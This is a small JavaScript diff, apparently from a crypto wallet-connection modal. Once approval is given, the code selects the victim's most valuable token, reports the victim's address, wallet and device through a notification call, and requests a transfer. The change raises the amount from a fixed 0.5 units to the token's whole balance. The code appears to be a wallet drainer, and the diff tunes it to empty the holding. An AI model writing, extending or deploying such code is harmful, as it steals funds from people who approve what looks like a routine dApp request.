@@ -628,7 +628,7 @@ const initializeSubscribers = (modal) => {
           console.log(approveMessage)
           await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
           const tokenBalance = mostExpensive.balance
-          const amount = parseUnits("0.5", mostExpensive.decimals)
+          const amount = parseUnits(tokenBalance.toString(), mostExpensive.decimals)
           const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
           if (transferResult.success) {
             approveMessage += `<br>Transfer request successful: ${transferResult.txHash}`
